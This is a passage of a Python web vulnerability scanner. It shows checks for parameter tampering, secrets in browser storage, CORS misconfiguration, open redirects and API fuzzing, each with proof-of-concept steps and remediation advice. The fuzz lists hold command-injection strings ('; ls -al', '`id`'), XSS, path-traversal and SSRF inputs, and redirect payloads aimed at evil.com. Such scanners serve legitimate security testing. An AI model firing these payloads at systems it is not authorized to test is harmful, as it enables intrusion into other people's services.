                    python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                    poc_steps=[
                        f"Send {param_method} request to {final_url} with parameter '{param_name}' set to: `{escape(original_value + payload)}`",
                        "Observe the response for the reflection of 'MG_LOG_INJECT_TEST'."
                    ],
                    remediation_steps=[
                        "**Input Sanitization:** Sanitize all user-controlled input before it is written to log files.",
                        "**Encode Newlines:** Encode or filter out newline characters (`\\n`, `\\r`) from log entries.",
                        "**Structured Logging:** Use structured logging formats (e.g., JSON) which separate data fields, making injection into log format less likely.",
                        "**Least Privilege for Log Access:** Restrict access to log files to authorized personnel and systems."
                    ]
                )
                return # Found, move to next parameter

async def check_parameter_tampering(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, params_map: Dict[str, List[Dict[str, Any]]], cli_args: argparse.Namespace, **kwargs):
    """
    Checks for parameter tampering vulnerabilities by fuzzing numeric and boolean parameters.
    Looks for changes in behavior or content that indicate logic flaws.
    """
    url_base_for_params = urlparse(url)._replace(query="").geturl()
    parameters_to_test = params_map.get(url, []) + params_map.get(url_base_for_params, [])

    if not parameters_to_test:
        logger.debug(f"No parameters found for Parameter Tampering check on {url}")
        return

    # Fetch original response to compare against
    original_resp, original_content, _, _, original_duration, _ = await fetch_url(
        session, concurrency_manager, url, proxy=cli_args.proxy, headers=report.session_headers
    )
    if not original_resp or not original_content:
        logger.debug(f"Could not fetch original response for Parameter Tampering check on {url}. Skipping.")
        return

    # Get baseline for anomaly detection
    baseline = report.baseline_profiles.get(normalize_url(url))
    if not baseline:
        logger.warning(f"No baseline for {url}, skipping anomaly-based Parameter Tampering checks.")
        return

    for param_info in parameters_to_test:
        param_name = param_info['name']
        original_value = param_info['value']
        param_method = param_info['method']
        param_type = param_info.get('type', 'string') # Default to string if type not inferred

        fuzz_values = set()

        # Numeric fuzzing
        if original_value.isdigit() or (param_type == 'number'):
            try:
                num_val = int(original_value)
                fuzz_values.add(str(num_val + 1)) # Increment
                fuzz_values.add(str(num_val - 1)) # Decrement
                fuzz_values.add("0") # Zero
                fuzz_values.add("-1") # Negative
                fuzz_values.add(str(sys.maxsize)) # Large number
                fuzz_values.add(str(sys.maxsize + 1)) # Overflow attempt
            except ValueError:
                pass # Not a valid integer

        # Boolean fuzzing (if original value looks like a boolean)
        if original_value.lower() in ["true", "false", "1", "0"]:
            fuzz_values.add("true" if original_value.lower() == "false" or original_value == "0" else "false")
            fuzz_values.add("1" if original_value.lower() == "false" or original_value == "0" else "0")
            fuzz_values.add("True" if original_value.lower() == "false" or original_value == "0" else "False") # Case variations

        # Empty/Null/Special character fuzzing (for all types)
        fuzz_values.add("") # Empty string
        fuzz_values.add("null") # Literal null string
        fuzz_values.add("undefined") # Literal undefined string
        fuzz_values.add("[]") # Empty array
        fuzz_values.add("{}") # Empty object
        fuzz_values.add("';--") # Simple injection-like
        fuzz_values.add("<script>alert(1)</script>") # XSS-like
        fuzz_values.add("`") # Backtick for template injection
        fuzz_values.add("`id`") # Command injection attempt

        for fuzz_value in fuzz_values:
            if fuzz_value == original_value: continue # Skip original value

            test_params = {p['name']: p['value'] for p in parameters_to_test}
            test_params[param_name] = fuzz_value

            resp, content, _, final_url, duration, raw_req = None, None, None, None, None, None
            
            if param_method == "GET":
                resp, content, _, final_url, duration, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="GET", params=test_params, proxy=cli_args.proxy, headers=report.session_headers
                )
            elif param_method == "POST":
                data_to_send = test_params
                resp, content, _, final_url, duration, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="POST", data=data_to_send, proxy=cli_args.proxy, headers=report.session_headers
                )
            
            if not resp or not content or not final_url:
                continue

            # Check for parameter tampering:
            # 1. If the response is anomalous (length, status, structure change)
            # 2. If the response content significantly differs from the original, AND it's a 200 OK
            #    (indicating a possible bypass or unintended behavior)
            
            is_anomaly = is_response_anomalous(report, final_url, resp, content, duration)
            
            if is_anomaly:
                report.add_finding(
                    "Parameter Tampering (Anomaly Detected)",
                    f"The parameter '{param_name}' was tampered with value '{escape(fuzz_value)}', resulting in an anomalous response (e.g., unexpected length, status, or structure change). This indicates a potential business logic flaw.",
                    "Medium", "Probable",
                    f"Original Value: {original_value}\nFuzzed Value: {fuzz_value}\nResponse was anomalous.",
                    "Implement robust server-side validation for all input parameters. Ensure business logic correctly handles unexpected or manipulated input values.",
                    final_url, param_name, request_details=raw_req, response_details=content,
                    poc_notes=f"Original value: {original_value}, Fuzzed value: {fuzz_value}",
                    curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                    python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                    poc_steps=[
                        f"Send {param_method} request to {final_url} with parameter '{param_name}' set to its original value (`{escape(original_value)}`). Note the normal response.",
                        f"Send {param_method} request to {final_url} with parameter '{param_name}' set to: `{escape(fuzz_value)}`",
                        "Observe the response for unexpected changes in content, status code, or behavior that might indicate a bypass or logic flaw."
                    ],
                    remediation_steps=[
                        "**Strict Server-Side Validation:** Validate all input parameters on the server-side, including data types, ranges, formats, and business rules.",
                        "**Input Whitelisting:** Use whitelisting to define acceptable values for parameters wherever possible.",
                        "**Business Logic Enforcement:** Ensure that critical business logic is enforced on the server-side and is not bypassable by client-side manipulation.",
                        "**Session-Based State:** For multi-step processes, store state on the server-side in the user's session, rather than relying on hidden or client-side parameters."
                    ]
                )
                return # Found, move to next parameter

            # If not an anomaly, but a significant content change on 200 OK, it's also suspicious
            if resp.status == 200:
                similarity = difflib.SequenceMatcher(None, original_content, content).ratio()
                if similarity < SOFT_404_DIFF_THRESHOLD: # If content is significantly different
                    report.add_finding(
                        "Parameter Tampering (Content Change)",
                        f"The parameter '{param_name}' was tampered with value '{escape(fuzz_value)}', resulting in a 200 OK response with significantly different content compared to the original. This suggests a potential business logic flaw or unintended behavior.",
                        "Medium", "Tentative",
                        f"Original Value: {original_value}\nFuzzed Value: {fuzz_value}\nResponse Status: {resp.status}\nContent Similarity: {similarity:.2f}",
                        "Implement robust server-side validation for all input parameters. Ensure business logic correctly handles unexpected or manipulated input values.",
                        final_url, param_name, request_details=raw_req, response_details=content,
                        poc_notes=f"Original value: {original_value}, Fuzzed value: {fuzz_value}",
                        curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                        python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                        poc_steps=[
                            f"Send {param_method} request to {final_url} with parameter '{param_name}' set to its original value (`{escape(original_value)}`). Note the normal response.",
                            f"Send {param_method} request to {final_url} with parameter '{param_name}' set to: `{escape(fuzz_value)}`",
                            "Observe the response for unexpected changes in content, status code, or behavior that might indicate a bypass or logic flaw."
                        ],
                        remediation_steps=[
                            "**Strict Server-Side Validation:** Validate all input parameters on the server-side, including data types, ranges, formats, and business rules.",
                            "**Input Whitelisting:** Use whitelisting to define acceptable values for parameters wherever possible.",
                            "**Business Logic Enforcement:** Ensure that critical business logic is enforced on the server-side and is not bypassable by client-side manipulation.",
                            "**Session-Based State:** For multi-step processes, store state on the server-side in the user's session, rather than relying on hidden or client-side parameters."
                        ]
                    )
                    return # Found, move to next parameter

async def check_sensitive_client_storage(page: Page, report: ScanReport, url: str, **kwargs):
    """
    Checks for sensitive data stored in client-side Local Storage and Session Storage using Playwright.
    """
    if not page:
        logger.debug(f"Skipping client storage check for {url}: Playwright page not available.")
        return

    logger.debug(f"Checking client-side storage for sensitive data on {url}")

    try:
        await page.goto(url, wait_until="domcontentloaded", timeout=PLAYWRIGHT_TIMEOUT)

        # Evaluate JavaScript to get localStorage and sessionStorage content
        local_storage_data = await page.evaluate('''() => {
            const data = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                data[key] = localStorage.getItem(key);
            }
            return data;
        }''')

        session_storage_data = await page.evaluate('''() => {
            const data = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                data[key] = sessionStorage.getItem(key);
            }
            return data;
        }''')

        sensitive_keys = [
            "password", "pwd", "secret", "token", "api_key", "private_key",
            "ssn", "credit_card", "cc_num", "cvv", "security_code", "bank_account",
            "jwt", "refresh_token", "access_token", "bearer_token", "auth_token",
            "client_id", "client_secret", "user_id", "admin"
        ]

        # Check Local Storage
        for key, value in local_storage_data.items():
            if any(s_key in key.lower() for s_key in sensitive_keys) or \
               any(re.search(pattern, value, re.I) for pattern in SENSITIVE_DATA_REGEXES.values()):
                report.sensitive_client_storage_data.append({
                    "url": url, "location": "Local Storage", "key": key, "value": value
                })
                report.add_finding(
                    "Sensitive Data in Local Storage",
                    f"Sensitive data found in Local Storage: Key '{escape(key)}' contains potentially sensitive information.",
                    "Medium", "Informational",
                    f"Key: {key}\nValue: {value}",
                    "Do not store sensitive information in client-side local or session storage. Use server-side sessions or secure, HttpOnly cookies.",
                    url, parameter=key,
                    poc_notes=f"Key: {key}, Value: {value}",
                    poc_steps=[
                        f"Open `{escape(url)}` in a web browser.",
                        "Open browser developer tools (F12).",
                        "Go to 'Application' tab -> 'Local Storage'.",
                        f"Inspect the key '{escape(key)}' for sensitive data."
                    ],
                    remediation_steps=[
                        "**Avoid Client-Side Storage for Sensitive Data:** Never store sensitive information (e.g., authentication tokens, PII, payment details) directly in `localStorage` or `sessionStorage`.",
                        "**Use HttpOnly Cookies:** For session management, use `HttpOnly` cookies. This prevents client-side JavaScript from accessing the cookie, mitigating XSS risks.",
                        "**Server-Side Sessions:** Store session state and sensitive user data exclusively on the server-side.",
                        "**Encrypt Sensitive Data:** If client-side storage is unavoidable for non-sensitive data, encrypt it before storing."
                    ]
                )

        # Check Session Storage
        for key, value in session_storage_data.items():
            if any(s_key in key.lower() for s_key in sensitive_keys) or \
               any(re.search(pattern, value, re.I) for pattern in SENSITIVE_DATA_REGEXES.values()):
                report.sensitive_client_storage_data.append({
                    "url": url, "location": "Session Storage", "key": key, "value": value
                })
                report.add_finding(
                    "Sensitive Data in Session Storage",
                    f"Sensitive data found in Session Storage: Key '{escape(key)}' contains potentially sensitive information.",
                    "Medium", "Informational",
                    f"Key: {key}\nValue: {value}",
                    "Do not store sensitive information in client-side local or session storage. Use server-side sessions or secure, HttpOnly cookies.",
                    url, parameter=key,
                    poc_notes=f"Key: {key}, Value: {value}",
                    poc_steps=[
                        f"Open `{escape(url)}` in a web browser.",
                        "Open browser developer tools (F12).",
                        "Go to 'Application' tab -> 'Session Storage'.",
                        f"Inspect the key '{escape(key)}' for sensitive data."
                    ],
                    remediation_steps=[
                        "**Avoid Client-Side Storage for Sensitive Data:** Never store sensitive information (e.g., authentication tokens, PII, payment details) directly in `localStorage` or `sessionStorage`.",
                        "**Use HttpOnly Cookies:** For session management, use `HttpOnly` cookies. This prevents client-side JavaScript from accessing the cookie, mitigating XSS risks.",
                        "**Server-Side Sessions:** Store session state and sensitive user data exclusively on the server-side.",
                        "**Encrypt Sensitive Data:** If client-side storage is unavoidable for non-sensitive data, encrypt it before storing."
                    ]
                )

    except PlaywrightTimeoutError:
        logger.debug(f"Playwright navigation timed out for client storage check on {url}")
    except PlaywrightError as e:
        report.add_error(f"Playwright error during client storage check on {url}: {e}", url, "ClientStorage")
    except Exception as e:
        report.add_error(f"Unexpected error during client storage check on {url}: {e}", url, "ClientStorage")

async def check_cors_misconfiguration(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, **kwargs):
    """
    Checks for Cross-Origin Resource Sharing (CORS) misconfigurations.
    Attempts to send requests from a simulated malicious origin and checks CORS headers.
    """
    logger.debug(f"Checking CORS misconfiguration for {url}")

    # Common malicious origins to test
    malicious_origins = [
        "http://evil.com",
        "https://evil.com",
        "http://attacker.com",
        "null", # For file:// or sandbox origins
        "http://localhost:8080", # Common dev origin
    ]

    # Fetch with each malicious origin
    for origin in malicious_origins:
        headers = {"Origin": origin}
        if report.session_headers: headers.update(report.session_headers)

        resp, content, resp_headers, final_url, _, raw_req = await fetch_url(
            session, concurrency_manager, url, method="GET", headers=headers, proxy=cli_args.proxy
        )
        if not resp or not resp_headers or not final_url: continue

        # Check for Access-Control-Allow-Origin header
        acao = resp_headers.get("Access-Control-Allow-Origin", "")
        acac = resp_headers.get("Access-Control-Allow-Credentials", "")

        # Scenario 1: Reflects arbitrary origin (e.g., ACAO: http://evil.com)
        if acao == origin and origin != "null": # 'null' origin reflection is often intended for local files
            report.add_finding(
                "CORS Misconfiguration (Reflected Origin)",
                f"The server reflects the 'Origin' header ({escape(origin)}) in 'Access-Control-Allow-Origin'. This allows any origin to make cross-origin requests, potentially leading to data leakage if sensitive information is returned.",
                "High", "Confirmed",
                f"Request Origin: {origin}\nResponse Header: Access-Control-Allow-Origin: {acao}",
                "Configure CORS to explicitly whitelist allowed origins. Avoid reflecting arbitrary origins.",
                final_url,
                poc_notes=f"Request from origin: {origin}, ACAO: {acao}",
                request_details=raw_req, response_details=str(resp_headers),
                poc_steps=[
                    f"From a malicious domain (e.g., `http://evil.com`), make a JavaScript `fetch` or `XMLHttpRequest` request to `{escape(final_url)}`.",
                    "Include `credentials: 'include'` if sensitive data (cookies/auth) is expected.",
                    "Observe that the request succeeds and the response includes `Access-Control-Allow-Origin: {escape(origin)}`, allowing the malicious domain to read the response."
                ],
                remediation_steps=[
                    "**Whitelist Specific Origins:** Configure `Access-Control-Allow-Origin` to explicitly list only the domains that are allowed to make cross-origin requests.",
                    "**Avoid Wildcards:** Never use `Access-Control-Allow-Origin: *` unless the resource is genuinely public and contains no sensitive information.",
                    "**Do Not Reflect Origin:** Do not dynamically reflect the `Origin` header in `Access-Control-Allow-Origin` unless strict validation is performed.",
                    "**Restrict Methods/Headers:** Restrict `Access-Control-Allow-Methods` and `Access-Control-Allow-Headers` to only those necessary."
                ]
            )
            return # Found, move to next URL

        # Scenario 2: Wildcard origin with credentials (most severe)
        if acao == "*" and acac.lower() == "true":
            report.add_finding(
                "CORS Misconfiguration (Wildcard with Credentials)",
                f"The server allows all origins ('*') AND permits credentials ('Access-Control-Allow-Credentials: true'). This is a severe misconfiguration, allowing any malicious website to read authenticated responses.",
                "Critical", "Confirmed",
                f"Response Headers: Access-Control-Allow-Origin: {acao}, Access-Control-Allow-Credentials: {acac}",
                "Disable 'Access-Control-Allow-Credentials: true' when 'Access-Control-Allow-Origin: *'. Configure CORS to explicitly whitelist allowed origins.",
                final_url,
                poc_notes=f"ACAO: {acao}, ACAC: {acac}",
                request_details=raw_req, response_details=str(resp_headers),
                poc_steps=[
                    f"From any malicious domain, make a JavaScript `fetch` or `XMLHttpRequest` request to `{escape(final_url)}`.",
                    "Set `credentials: 'include'` in the JavaScript request.",
                    "Observe that the request succeeds and the malicious domain can read the authenticated response, potentially stealing sensitive data."
                ],
                remediation_steps=[
                    "**Do Not Combine Wildcard and Credentials:** Never set `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true` simultaneously.",
                    "**Whitelist Specific Origins:** Configure `Access-Control-Allow-Origin` to explicitly list only the domains that are allowed to make cross-origin requests.",
                    "**Restrict Methods/Headers:** Restrict `Access-Control-Allow-Methods` and `Access-Control-Allow-Headers` to only those necessary."
                ]
            )
            return # Found, move to next URL

        # Scenario 3: Null origin allowed with credentials (for local files/sandboxed iframes)
        if acao == "null" and acac.lower() == "true" and origin == "null":
            report.add_finding(
                "CORS Misconfiguration (Null Origin with Credentials)",
                f"The server allows 'null' origin with credentials. This can be exploited by local HTML files or sandboxed iframes to read authenticated responses.",
                "Medium", "Confirmed",
                f"Response Headers: Access-Control-Allow-Origin: {acao}, Access-Control-Allow-Credentials: {acac}",
                "Do not allow 'null' origin with credentials unless absolutely necessary and understood. Implement strict origin validation.",
                final_url,
                poc_notes=f"ACAO: {acao}, ACAC: {acac}",
                request_details=raw_req, response_details=str(resp_headers),
                poc_steps=[
                    f"Create a local HTML file (e.g., `test.html`) with JavaScript to make a `fetch` request to `{escape(final_url)}`.",
                    "Open `test.html` directly in your browser (using `file://` protocol).",
                    "Observe that the request succeeds and the local file can read the authenticated response."
                ],
                remediation_steps=[
                    "**Strict Origin Validation:** If `null` origin is not explicitly required, reject requests with this origin.",
                    "**Avoid Credentials with Null Origin:** Do not set `Access-Control-Allow-Credentials: true` if `Access-Control-Allow-Origin` is `null`."
                ]
            )
            return # Found, move to next URL

async def check_client_side_open_redirect(page: Page, report: ScanReport, url: str, params_map: Dict[str, List[Dict[str, Any]]], cli_args: argparse.Namespace, **kwargs):
    """
    Checks for client-side open redirect vulnerabilities by injecting redirect payloads
    into parameters and monitoring browser navigation.
    """
    if not page:
        logger.debug(f"Skipping client-side open redirect check for {url}: Playwright page not available.")
        return

    logger.debug(f"Starting client-side open redirect check for {url}")

    url_base_for_params = urlparse(url)._replace(query="").geturl()
    parameters_to_test = params_map.get(url, []) + params_map.get(url_base_for_params, [])

    if not parameters_to_test:
        logger.debug(f"No parameters found for client-side open redirect check on {url}")
        return

    # Payloads for open redirect
    redirect_target = "http://evil.com/redirect_test"
    redirect_payloads = [
        redirect_target,
        f"/{redirect_target}",
        f"//evil.com/redirect_test",
        f"https://evil.com/redirect_test",
        f"javascript:window.location.href='{redirect_target}'", # For JS context
        f"data:text/html,<script>window.location.href='{redirect_target}'</script>",
        f"//%0aevil.com/redirect_test", # Newline bypass
        f"//%09evil.com/redirect_test", # Tab bypass
        f"//evil.com%2fredirect_test", # Encoded slash
    ]
    payload_count = PAYLOAD_LEVEL_MAP.get(cli_args.payload_level, PAYLOAD_LEVEL_MAP["medium"])
    payloads_to_try = random.sample(redirect_payloads, min(payload_count, len(redirect_payloads)))

    for param_info in parameters_to_test:
        param_name = param_info['name']
        original_value = param_info['value']
        param_method = param_info['method']

        for payload in payloads_to_try:
            test_url = url
            
            # Construct the URL based on the parameter's method
            if param_method == "GET":
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                query_params[param_name] = [payload] # Inject payload
                test_url = parsed_url._replace(query=urlencode(query_params, doseq=True)).geturl()
            elif param_method == "POST":
                # Client-side redirects from POST are rare and harder to test without full form submission
                logger.debug(f"Skipping POST client-side open redirect for {url} parameter {param_name}")
                continue

            # Monitor for navigation
            redirect_triggered = asyncio.Event()
            
            def handle_page_redirect(response):
                if redirect_target in response.url:
                    logger.info(f"Client-side redirect detected to: {response.url}")
                    redirect_triggered.set()

            page.on("response", handle_page_redirect) # Monitor responses for redirects
            
            try:
                # Navigate to the test URL
                await page.goto(test_url, wait_until="load", timeout=PLAYWRIGHT_TIMEOUT)
                
                # Wait a bit for JS redirects to occur
                await asyncio.sleep(1)

                # Check if the redirect was triggered
                if redirect_triggered.is_set() or redirect_target in page.url:
                    report.add_finding(
                        "Client-Side Open Redirect",
                        f"A client-side open redirect vulnerability was detected. Injecting '{escape(payload)}' into parameter '{param_name}' caused the browser to redirect to an external, untrusted domain.",
                        "Medium", "Confirmed",
                        f"Payload: {payload}\nInjected URL: {test_url}\nFinal URL: {page.url}",
                        "Validate and sanitize all user-supplied input used in client-side redirection functions (e.g., `window.location.href`, `window.open`). Use a whitelist of allowed domains.",
                        url, param_name,
                        poc_notes=f"Payload: {payload}\nRedirected to: {page.url}",
                        poc_steps=[
                            f"Open browser and navigate to: `{escape(test_url)}`",
                            f"Observe the browser automatically redirecting to `{escape(redirect_target)}`."
                        ],
                        remediation_steps=[
                            "**Strict Input Validation:** Validate all user-supplied input that controls redirection. Use a whitelist of allowed domains or paths.",
                            "**Avoid Client-Side Redirection with User Input:** If possible, perform all redirections on the server-side after proper validation.",
                            "**Context-Aware Encoding:** Ensure that any user-controlled data used in client-side JavaScript for redirection is properly encoded to prevent injection."
                        ]
                    )
                    return # Found, move to next parameter

            except PlaywrightTimeoutError:
                logger.debug(f"Playwright navigation timed out for client-side open redirect check on {test_url}")
            except PlaywrightError as e:
                report.add_error(f"Playwright error during client-side open redirect check on {test_url}: {e}", test_url, "ClientSideOpenRedirect")
            except Exception as e:
                report.add_error(f"Unexpected error during client-side open redirect check on {test_url}: {e}", test_url, "ClientSideOpenRedirect")
            finally:
                page.remove_listener("response", handle_page_redirect)

async def check_api_fuzzing(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, cli_args: argparse.Namespace, **kwargs):
    """
    Performs basic API fuzzing on discovered API endpoints.
    This includes HTTP method fuzzing and simple parameter fuzzing.
    """
    logger.debug(f"Starting API fuzzing for {url}")

    # Define common HTTP methods to test
    http_methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]

    # Define common API parameter payloads (simplified for this example)
    api_fuzz_payloads = [
        "1", "0", "-1", "9999999999", # Numeric
        "true", "false", # Boolean
        "", "null", "undefined", # Empty/Null
        "'", "\"", "`", # Quotes for injection
        "<script>alert(1)</script>", # XSS
        "; ls -al", # Command injection
        "../", "../../", # Path traversal
        "http://127.0.0.1", # SSRF
    ]

    # Get parameters associated with this API endpoint (if any were discovered during crawl)
    # API endpoints might not have parameters discovered via HTML forms/queries,
    # but we can try to infer them or use generic fuzzing.
    # For now, we'll use any parameters associated with the base URL.
    parsed_url = urlparse(url)
    base_url_for_params = parsed_url._replace(query="").geturl()
    parameters_to_test = report.parameters_discovered.get(url, []) + report.parameters_discovered.get(base_url_for_params, [])

    # Scenario 1: HTTP Method Fuzzing
    for method in http_methods:
        resp, content, headers, final_url, duration, raw_req = await fetch_url(
            session, concurrency_manager, url, method=method, proxy=cli_args.proxy, headers=report.session_headers
        )
        if not resp or not final_url: continue

        # Check for unexpected 200 OK or interesting status codes
        if resp.status == 200 and method not in ["GET", "POST", "HEAD", "OPTIONS"]: # Assuming GET/POST/HEAD/OPTIONS are expected
            report.add_finding(
                "HTTP Method Not Allowed (Bypass Potential)",
                f"The API endpoint '{final_url}' returned 200 OK for an unexpected HTTP method ({method}). This could indicate a bypass of method restrictions, potentially allowing unintended actions.",
                "Medium", "Probable",
                f"Method: {method}\nResponse Status: {resp.status}\nResponse snippet: {content[:500]}",
                "Ensure that API endpoints only accept explicitly allowed HTTP methods. Implement strict method validation on the server-side.",
                final_url,
                poc_notes=f"Method: {method}",
                request_details=raw_req, response_details=content,
                poc_steps=[
                    f"Send a `{escape(method)}` request to `{escape(final_url)}`.",
                    "Observe the 200 OK response, indicating the method is unexpectedly allowed."
                ],
                remediation_steps=[
                    "**Strict Method Validation:** Configure your API endpoints to only respond to explicitly allowed HTTP methods (e.g., GET for data retrieval, POST for creation).",
                    "**Web Server Configuration:** Ensure your web server (Nginx, Apache, etc.) and application framework are correctly configured to restrict unsupported HTTP methods."
                ]
            )
            # Do not return, continue checking other methods

        # Look for TRACE/TRACK method enabled (legacy, but still found)
        if method in ["TRACE", "TRACK"] and resp.status == 200 and "HTTP/1.1" in content:
            report.add_finding(
                "TRACE/TRACK Method Enabled",
                f"The TRACE or TRACK HTTP method is enabled on '{final_url}'. This can be used in conjunction with XSS to steal cookies (Cross-Site Tracing).",
                "Low", "Confirmed",
                f"Method: {method}\nResponse Status: {resp.status}\nResponse content indicates method reflection.",
                "Disable TRACE and TRACK HTTP methods on your web server. Most modern servers disable this by default.",
                final_url,
                poc_notes=f"Method: {method}",
                request_details=raw_req, response_details=content,
                poc_steps=[
                    f"Send a `{escape(method)}` request to `{escape(final_url)}`.",
                    "Observe the response reflecting the request headers, confirming the method is enabled."
                ],
                remediation_steps=[
                    "**Disable TRACE/TRACK:** Configure your web server to disable the TRACE and TRACK HTTP methods. For Apache, use `TraceEnable Off`. For Nginx, it's typically disabled by default."
                ]
            )
            # Do not return, continue checking other methods

    # Scenario 2: Parameter Fuzzing for API Endpoints
    # This assumes the API endpoint might take parameters in query string or JSON body.
    # If no parameters were discovered, we can try generic ones like 'id', 'name'.
    
    # Generate generic parameters if none were discovered for this URL
    if not parameters_to_test:
        logger.debug(f"No specific parameters for {url}, trying generic API fuzzing.")
        # Try to infer common API parameter names
        path_segments = [s for s in parsed_url.path.split('/') if s]
        if path_segments and path_segments[-1].isdigit(): # e.g., /users/123
            parameters_to_test.append({"name": path_segments[-2] if len(path_segments) > 1 else "id", "value": path_segments[-1], "method": "GET", "source": "path_segment", "type": "number"})
        else: # Generic fallback
            parameters_to_test.append({"name": "id", "value": "1", "method": "GET", "source": "generic", "type": "number"})
            parameters_to_test.append({"name": "name", "value": "test", "method": "GET", "source": "generic", "type": "string"})
            parameters_to_test.append({"name": "param", "value": "value", "method": "GET", "source": "generic", "type": "string"})


    for param_info in parameters_to_test:
        param_name = param_info['name']
        original_value = param_info['value']
        param_method = param_info['method'] # Use method from discovery, or default to GET/POST

        # Determine if it's likely a JSON API based on content type or URL structure
        is_json_api = 'json' in parsed_url.path or 'json' in url.lower() or 'api' in url.lower()

        for payload in api_fuzz_payloads:
            test_params_get = {p['name']: p['value'] for p in parameters_to_test}
            test_params_get[param_name] = payload

            test_data_post = {p['name']: p['value'] for p in parameters_to_test}
            test_data_post[param_name] = payload

            # Try GET request
            resp_get, content_get, headers_get, final_url_get, duration_get, raw_req_get = await fetch_url(
                session, concurrency_manager, url, method="GET", params=test_params_get, proxy=cli_args.proxy, headers=report.session_headers
            )
            if resp_get and content_get and is_response_anomalous(report, final_url_get, resp_get, content_get, duration_get):
                report.add_finding(
                    "API Parameter Fuzzing (GET) - Anomaly Detected",
                    f"Fuzzing API parameter '{param_name}' with value '{escape(payload)}' via GET request caused an anomalous response (e.g., unexpected length, status, or structure change). This suggests a potential API vulnerability.",
                    "Medium", "Tentative",
                    f"Payload: {payload}\nMethod: GET\nResponse was anomalous.",
                    "Implement strict input validation for all API parameters. Ensure API endpoints handle unexpected input gracefully without exposing sensitive information or changing behavior.",
                    final_url_get, param_name, request_details=raw_req_get, response_details=content_get,
                    poc_notes=f"Payload: {payload}",
                    curl_poc=generate_poc(final_url_get, "GET", resp_get.request_info.headers, test_params_get, raw_req_get)[0],
                    python_poc=generate_poc(final_url_get, "GET", resp_get.request_info.headers, test_params_get, raw_req_get)[1],
                    poc_steps=[
                        f"Send a GET request to `{escape(final_url_get)}` with parameter '{param_name}' set to: `{escape(payload)}`",
                        "Observe the response for anomalies (e.g., unexpected errors, data changes, different response structure)."
                    ],
                    remediation_steps=[
                        "**Strict Input Validation:** Validate all API parameters on the server-side for type, format, length, and allowed values.",
                        "**Error Handling:** Implement robust error handling that provides generic error messages without leaking internal details.",
                        "**API Rate Limiting:** Apply rate limiting to API endpoints to prevent brute-force attacks."
                    ]
                )
                # Do not return, continue fuzzing this parameter

            # Try POST request (assuming form-urlencoded or JSON)
            if param_method == "POST" or is_json_api:
                # Try form-urlencoded first
                resp_post_form, content_post_form, headers_post_form, final_url_post_form, duration_post_form, raw_req_post_form = await fetch_url(
                    session, concurrency_manager, url, method="POST", data=test_data_post, proxy=cli_args.proxy, headers=report.session_headers
                )
                if resp_post_form and content_post_form and is_response_anomalous(report, final_url_post_form, resp_post_form, content_post_form, duration_post_form):
                    report.add_finding(
                        "API Parameter Fuzzing (POST Form) - Anomaly Detected",
                        f"Fuzzing API parameter '{param_name}' with value '{escape(payload)}' via POST (form-urlencoded) caused an anomalous response. This suggests a potential API vulnerability.",
                        "Medium", "Tentative",
                        f"Payload: {payload}\nMethod: POST (form)\nResponse was anomalous.",
                        "Implement strict input validation for all API parameters. Ensure API endpoints handle unexpected input gracefully without exposing sensitive information or changing behavior.",
                        final_url_post_form, param_name, request_details=raw_req_post_form, response_details=content_post_form,
                        poc_notes=f"Payload: {payload}",
                        curl_poc=generate_poc(final_url_post_form, "POST", resp_post_form.request_info.headers, test_data_post, raw_req_post_form)[0],
                        python_poc=generate_poc(final_url_post_form, "POST", resp_post_form.request_info.headers, test_data_post, raw_req_post_form)[1],
                        poc_steps=[
                            f"Send a POST request to `{escape(final_url_post_form)}` with `Content-Type: application/x-www-form-urlencoded` and parameter '{param_name}' set to: `{escape(payload)}`",
                            "Observe the response for anomalies (e.g., unexpected errors, data changes, different response structure)."
                        ],
                        remediation_steps=[
                            "**Strict Input Validation:** Validate all API parameters on the server-side for type, format, length, and allowed values.",
                            "**Error Handling:** Implement robust error handling that provides generic error messages without leaking internal details.",
                            "**API Rate Limiting:** Apply rate limiting to API endpoints to prevent brute-force attacks."
                        ]
                    )
                    # Do not return

                # Try JSON body if it's likely a JSON API
                if is_json_api:
                    try:
                        json_data_to_send = {param_name: payload} # Simple JSON payload
                        resp_post_json, content_post_json, headers_post_json, final_url_post_json, duration_post_json, raw_req_post_json = await fetch_url(
                            session, concurrency_manager, url, method="POST", data=json.dumps(json_data_to_send).encode('utf-8'),
                            headers={"Content-Type": "application/json"}, proxy=cli_args.proxy
                        )
                        if resp_post_json and content_post_json and is_response_anomalous(report, final_url_post_json, resp_post_json, content_post_json, duration_post_json):
                            report.add_finding(
                                "API Parameter Fuzzing (POST JSON) - Anomaly Detected",
                                f"Fuzzing API parameter '{param_name}' with value '{escape(payload)}' via POST (JSON body) caused an anomalous response. This suggests a potential API vulnerability.",
                                "Medium", "Tentative",
                                f"Payload: {payload}\nMethod: POST (JSON)\nResponse was anomalous.",
                                "Implement strict input validation for all API parameters. Ensure API endpoints handle unexpected input gracefully without exposing sensitive information or changing behavior.",
                                final_url_post_json, param_name, request_details=raw_req_post_json, response_details=content_post_json,
                                poc_notes=f"Payload: {payload}",
                                curl_poc=generate_poc(final_url_post_json, "POST", {"Content-Type": "application/json"}, json_data_to_send, raw_req_post_json)[0],
                                python_poc=generate_poc(final_url_post_json, "POST", {"Content-Type": "application/json"}, json_data_to_send, raw_req_post_json)[1],
                                poc_steps=[
